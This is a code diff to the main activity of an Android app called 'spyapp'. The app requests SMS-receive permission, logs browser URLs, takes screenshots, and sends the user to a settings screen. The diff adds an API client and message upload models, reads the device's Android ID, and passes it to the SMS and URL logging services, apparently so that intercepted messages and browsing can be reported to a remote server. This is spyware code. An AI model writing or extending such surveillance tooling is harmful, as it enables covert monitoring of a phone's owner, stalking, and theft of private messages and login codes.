@@ -1,5 +1,7 @@
 package com.extrainch.spyapp;
 
+import static android.content.ContentValues.TAG;
+
 import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
@@ -7,10 +9,10 @@ import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Environment;
 import android.provider.Settings;
 import android.text.TextUtils;
 import android.text.method.ScrollingMovementMethod;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
@@ -19,22 +21,34 @@ import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.extrainch.Api.ApiClient;
+import com.extrainch.Models.NewMessageModel;
+import com.extrainch.Models.NewMessageResponseModel;
+
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.Date;
 
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+
 public class MainActivity extends AppCompatActivity {
-    private TextView mStatus;
+    private TextView mStatus, imei;
     private TextView mLogs;
     private Button btnSet, button2;
     public static String strLogs = "";
+    String deviceId;
+    ApiClient apiClient;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        apiClient = ApiClient.getInstance();
 
         if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
             requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS}, 1000);
@@ -42,6 +56,7 @@ public class MainActivity extends AppCompatActivity {
 
         btnSet = (Button) findViewById(R.id.button);
         mStatus = (TextView) findViewById(R.id.textView);
+        imei = (TextView) findViewById(R.id.imei);
         mLogs = (TextView) findViewById(R.id.textView3);
         button2 = (Button) findViewById(R.id.button2);
         btnSet.setOnClickListener(v -> {
@@ -50,9 +65,16 @@ public class MainActivity extends AppCompatActivity {
             //  intent.setData(uri);
             startActivity(intent);
         });
-        button2.setOnClickListener(v -> screenshot());
+//        button2.setOnClickListener(v -> readText());
+
+        deviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
+        imei.setText(deviceId.toString());
+        ReceiveSms.onIdRecv(deviceId);
+        LogUrlService.onIdRecv(deviceId);
+
         DoInit();
     }
+
 
     //readsms start
     @Override
@@ -71,7 +93,7 @@ public class MainActivity extends AppCompatActivity {
 
     //browser log start
     public static void onBrowserRecv(String str) {
-        strLogs += str + "\r\n\r\n";
+        strLogs += str;
     }
 
     void DoInit() {
@@ -131,7 +153,7 @@ public class MainActivity extends AppCompatActivity {
         Date date = new Date();
         CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
 //        String filename = Environment.getExternalStorageDirectory(Environment.DIRECTORY_DOWNLOADS) + "/spyapp" + now + ".jpg";
-        java.io.File filename = new java.io.File((MainActivity.this.getApplicationContext().getFileStreamPath("spyapp" + now +".jpg").getPath()));
+        java.io.File filename = new java.io.File((MainActivity.this.getApplicationContext().getFileStreamPath("spyapp" + now + ".jpg").getPath()));
         View root = getWindow().getDecorView();
         root.setDrawingCacheEnabled(true);
         Bitmap bitmap = Bitmap.createBitmap(root.getDrawingCache());
@@ -156,4 +178,6 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
     }
+
+
 }
